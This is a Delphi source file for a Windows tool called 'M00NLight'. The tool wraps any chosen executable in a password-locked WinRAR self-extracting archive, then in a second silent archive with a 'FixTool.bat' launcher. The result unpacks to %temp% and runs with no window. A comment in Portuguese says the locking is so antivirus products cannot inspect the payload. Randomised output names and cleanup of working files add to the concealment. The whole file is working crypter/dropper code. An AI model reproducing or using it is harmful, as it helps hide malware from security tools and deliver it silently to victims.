unit untMain;



interface

uses
  Windows,Classes, dprocess, SysUtils, Forms, Controls, Graphics, Dialogs, ExtCtrls,
  StdCtrls,  Shlobj, Vcl.ComCtrls, Vcl.Menus, system.IOUtils;

type

  { TMoonForm }

  TMainform = class(TForm)
    SourceLBL: TLabel;
    SourceEDT: TEdit;
    LoadBTN1: TButton;
    RARLBL: TLabel;
    RAREDT: TEdit;
    LoadBTN2: TButton;
    SaveLBL: TLabel;
    SaveEDT: TEdit;
    SaveBTN: TButton;
    BTNGerar: TButton;
    ProgressBar: TProgressBar;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    WinDialog1: TOpenDialog;
    PopupMenu1: TPopupMenu;
    procedure BTNGerarClick(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure LoadBTN1Click(Sender: TObject);
    procedure LoadBTN2Click(Sender: TObject);
    procedure SaveBTNClick(Sender: TObject);
  private
    function momeexe: string;
    { private declarations }
  public
    { public declarations }
  end;

var
  Mainform: TMainform;
  Master: TProcess;
  FFile: Text;
  Pass: String;

implementation

{$R *.dfm}

{ TMoonForm }

function RandomStr(PLen: Integer; Dict: String): string;
var
  str: string;
begin
  str    := Dict;
  Result := '';
  repeat
    Result := Result + str[Random(Length(str)) + 1];
  until (Length(Result) = PLen)
end;

function TMainform.momeexe:string;
const	sim='EEASFDGNLKNWOIYTEEASFDGNLKNWOIYTaabcdfghijlmnopqrstuvxzABCDEeeiioouu1234567890';
var
winram :string;
x:integer;
  begin
   for x:=1 to 13 do
    winram := winram + sim[Random(Length(sim)) + 1];
   Result := winram;
 end;

procedure TMainform.FormActivate(Sender: TObject);
var
  dirbin :string;
begin
  dirbin :=  ExtractFilePath(ParamStr(0))+'bin\';
  Randomize;
  Pass:=RandomStr(8,'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890');
  if not DirectoryExists(dirbin) then
     ForceDirectories(dirbin);
  SaveEDT.Text:=dirbin+momeexe+'.exe';
  if (FileExists('C:\Program Files\WinRAR\Rar.exe')) then
    RAREDT.Text:='C:\Program Files\WinRAR\Rar.exe'
  else
  if (FileExists('C:\Program Files (x86)\WinRAR\Rar.exe')) then
    RAREDT.Text:='C:\Program Files (x86)\WinRAR\Rar.exe'
  else
    ShowMessage('M�dulo RAR n�o encontrado! Selecione-o manualmente!');
end;

function GetCMDPath(Folder: Integer; CanCreate: Boolean): string;
var
   FilePath: array [0..255] of char;
begin
 SHGetSpecialFolderPath(0, @FilePath[0], FOLDER, CanCreate);
 Result := FilePath+'\cmd.exe';
end;

procedure ChDel(FileToDel: String);
Begin
 if FileExists(FileToDel) then DeleteFile(FileToDel);
end;

procedure CleanUp;
Begin
  ChDel('crypt.exe');
  ChDel('Sources.exe');
  ChDel('FixTool.bat');
  ChDel('SFXConfig.cfg');
  with Mainform do Begin
  ChDel(ExtractFileName(SourceEDT.Text));
  ChDel(ExtractFileName(SaveEDT.Text));
  end;
end;

procedure DisableComponents;
Begin
 with Mainform Do Begin
   BTNGerar.Enabled:=False;
   LoadBTN1.Enabled:=False;
   LoadBTN2.Enabled:=False;
   SaveBTN.Enabled:=False;
   SourceEDT.Enabled:=False;
   RAREDT.Enabled:=False;
   SaveEDT.Enabled:=False;
 end;
end;

procedure Step;
Begin
 with Mainform do ProgressBar.Position:=ProgressBar.Position+10;
end;

procedure EnableComponents;
Begin
 with Mainform Do Begin
   BTNGerar.Enabled:=True;
   LoadBTN1.Enabled:=True;
   LoadBTN2.Enabled:=True;
   SaveBTN.Enabled:=True;
   SourceEDT.Enabled:=True;
   RAREDT.Enabled:=True;
   SaveEDT.Enabled:=True;
 end;
end;

procedure TMainform.BTNGerarClick(Sender: TObject);
begin
 DisableComponents;
  if (FileExists(RAREDT.Text)) and (FileExists(SourceEDT.Text)) then Begin
    CleanUp;
    Step;
    AssignFile(FFile,'SFXConfig.cfg');
    Rewrite(FFile);
    Writeln(FFile,';Este arquivo cont�m instru��es SFX.');
    Writeln(FFile,';Eles s�o usados para compactar a fonte');
    Writeln(FFile,';E bloqueie-o para que os AVs n�o possam acess�-lo.');
    Writeln(FFile);
    Writeln(FFile,'Path=%temp%');
    Writeln(FFile,'SavePath');
    Writeln(FFile,'Setup='+ExtractFileName(SourceEDT.Text));
    Writeln(FFile,'TempMode');
    Writeln(FFile,'Silent=1');
    Writeln(FFile,'Overwrite=1');
    Writeln(FFile,'Title=M00NLight');
    CloseFile(FFile);
    Step;
    if CopyFile(PWideChar(SourceEDT.Text),PWideChar(ExtractFilePath(ParamStr(0))+ExtractFileName(SourceEDT.Text)),true) then Begin
      Master:=TProcess.Create(nil);
      Master.Executable:=RAREDT.Text;
      Master.ShowWindow:=swoHIDE;
      Master.Options:=[];
      Master.CurrentDirectory:=ExtractFileDir(ParamStr(0));
      Master.Parameters.Add('a -cfg -k -m5 -p"'+Pass+'" -sfx -z"'+ExtractFilePath(ParamStr(0))+'SFXConfig.cfg" "Sources" "'+ExtractFileName(SourceEDT.Text)+'"');
      Master.Execute;
      Repeat
        Application.ProcessMessages;
        Mainform.Update;
      until Not(Master.Running);
      Master.Free;
      Step;
      Step;
      AssignFile(FFile,'FixTool.bat');
      Rewrite(FFile);
      Writeln(FFile,'Sources.exe -p"'+Pass+'"');
      CloseFile(FFile);
      Step;
      AssignFile(FFile,'SFXConfig.cfg');
      Rewrite(FFile);
      Writeln(FFile,';Este arquivo cont�m instru��es SFX.');
      Writeln(FFile,';Eles s�o usados para compactar a fonte.');
      Writeln(FFile);
      Writeln(FFile,'Path=%temp%');
      Writeln(FFile,'SavePath');
      Writeln(FFile,'Setup=FixTool.bat');
      Writeln(FFile,'TempMode');
      Writeln(FFile,'Silent=1');
      Writeln(FFile,'Overwrite=1');
      Writeln(FFile,'Title=M00NLight');
      CloseFile(FFile);
      Step;
      Master:=TProcess.Create(nil);
      Master.Executable:=RAREDT.Text;
      Master.ShowWindow:=swoHIDE;
      Master.Options:=[];
      Master.CurrentDirectory:=ExtractFileDir(ParamStr(0));
      Master.Parameters.Add('a -cfg -m5 -sfx -z"'+ExtractFilePath(ParamStr(0))+'SFXConfig.cfg" "'+ExtractFileName(SaveEDT.Text)+'" "Sources.exe" "FixTool.bat"');
      Master.Execute;
      Repeat
        Application.ProcessMessages;
        Mainform.Update;
      until Not(Master.Running);
      Master.Free;
      Step;
      Step;
      CopyFile(PWideChar(ExtractFileName(SaveEDT.Text)),PWideChar(SaveEDT.Text),true);
      Step;
      ShowMessage('Arquivo criado com sucesso!');
    end;
  end else ShowMessage('Entrada invalida!');
  CleanUp;
  Step;
  ProgressBar.Position:=0;
  EnableComponents;
end;

procedure TMainform.LoadBTN1Click(Sender: TObject);
begin
  if OpenDialog1.Execute then
  if FileExists(OpenDialog1.FileName) then Begin
    SourceEDT.Text:=OpenDialog1.FileName;
  end;
  OpenDialog1.FileName:='';
end;

procedure TMainform.LoadBTN2Click(Sender: TObject);
begin
  if WinDialog1.Execute then
  if (FileExists(WinDialog1.FileName)) and (Pos('Rar.exe',WinDialog1.FileName)>0) then Begin
    RAREDT.Text:=WinDialog1.FileName;
  end;
  WinDialog1.FileName:='';
end;

procedure TMainform.SaveBTNClick(Sender: TObject);
begin
  if SaveDialog1.Execute then
    SaveEDT.Text:=SaveDialog1.FileName;
  SaveDialog1.FileName:='';
end;

end.

